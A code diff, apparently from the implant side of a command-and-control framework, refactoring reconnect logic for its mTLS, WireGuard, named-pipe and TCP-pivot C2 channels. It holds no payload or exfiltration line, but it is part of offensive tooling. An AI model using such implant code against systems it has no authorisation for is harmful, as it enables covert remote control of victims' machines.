@@ -73,7 +73,7 @@ ConnLoop:
 				// {{if .Config.Debug}}
 				log.Printf("[mtls] Connection failed: %s", err)
 				// {{end}}
-				t.attempts++
+				t.FailedAttempt()
 				continue
 			}
 
@@ -112,12 +112,14 @@ ConnLoop:
 			t.Conn = conn
 
 			// Once we will close this C2 channel, we need to perform custom
-			// cleanup here: closing the WireGuard virtual interface.
-			t.cleanup = func() {
+			// cleanup here: closing the WireGuard virtual interface:
+			// Passed to the Session layer when setting up the Session.
+			t.cleanup = func() error {
 				// {{if .Config.Debug}}
 				log.Printf("Closing Wireguard interface")
 				// {{end}}
 				dev.Close()
+				return nil
 			}
 			break ConnLoop
 			// {{end}} - WGc2Enabled
@@ -129,7 +131,7 @@ ConnLoop:
 				// {{if .Config.Debug}}
 				log.Printf("[namedpipe] Connection failed: %s", err)
 				// {{end}}
-				t.attempts++
+				t.FailedAttempt()
 				continue
 			}
 			break ConnLoop
@@ -142,7 +144,7 @@ ConnLoop:
 				// {{if .Config.Debug}}
 				log.Printf("[tcppivot] Connection failed: %s", err)
 				// {{end}}
-				t.attempts++
+				t.FailedAttempt()
 				continue
 			}
 			break ConnLoop
@@ -152,7 +154,7 @@ ConnLoop:
 			// {{if .Config.Debug}}
 			log.Printf(err.Error())
 			// {{end}}
-			return
+			return nil
 		}
 
 		// In case of failure to initiate a session, sleep
@@ -192,7 +194,7 @@ ConnLoop:
 				// {{if .Config.Debug}}
 				log.Printf("[mtls] Connection failed: %s", err)
 				// {{end}}
-				t.attempts++
+				t.FailedAttempt()
 				continue
 			}
 			break ConnLoop
@@ -205,7 +207,7 @@ ConnLoop:
 				// {{if .Config.Debug}}
 				log.Printf("[namedpipe] Connection failed: %s", err)
 				// {{end}}
-				t.attempts++
+				t.FailedAttempt()
 				continue
 			}
 			break ConnLoop
@@ -219,7 +221,7 @@ ConnLoop:
 				// {{if .Config.Debug}}
 				log.Printf("[mtls] Connection failed: %s", err)
 				// {{end}}
-				t.attempts++
+				t.FailedAttempt()
 				continue
 			}
 			break ConnLoop
